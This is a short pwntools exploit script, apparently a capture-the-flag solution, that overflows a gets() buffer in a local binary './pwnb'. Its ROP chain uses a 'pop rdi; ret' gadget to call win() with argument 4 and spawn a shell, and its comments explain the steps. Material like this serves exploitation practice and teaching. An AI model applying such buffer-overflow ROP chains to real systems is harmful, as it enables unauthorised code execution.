#!/bin/python3

from pwn import *
context(arch="amd64")

p = process("./pwnb")

# As we can see in IDA/Ghidra, when calling win() we have to set the EDI register to value 0x4 so that the "if condition" executes the system('/bin/sh') command
# So we have to find either 2 gadgets "xor rdi, rdi; ret;" and "pop edi; ret;", OR simply 1 gadget "pop rdi; ret"
# Finally, we can't find the first set of 2 gadgets, but we're able to find the last set of 1 gadget "pop rdi; ret" with ropper for example --> ropper -f pwnb |grep "rdi"
# We receive this --> 0x40120b: pop rdi; ret
# So now we know the address of this gadget + the address of win() which is 0x401142

# So payload will look like: [24 bytes of whatever before saved RIP] + [Address of POP RDI; RET; gadget] + [Value 0x4 so that it's popped to RDI register] + [Call to win() address with RDI correctly initialized]

pop_rdi_addr = p64(0x40120b)
win_func_addr = p64(0x401142)

payload = b'A'*24
payload += pop_rdi_addr
payload += p64(0x00000004) # this value is popped to RDI thanks to the gadget just before
payload += win_func_addr

# Send all the stuff
# Note: gets() stops reading new chars when it encounters a newline char (0xa --> '\n'), but it doesn't care about nullbytes
# So no problem if nullbytes are present in our payload

print(p.recvline())
p.sendline(payload)
p.interactive()
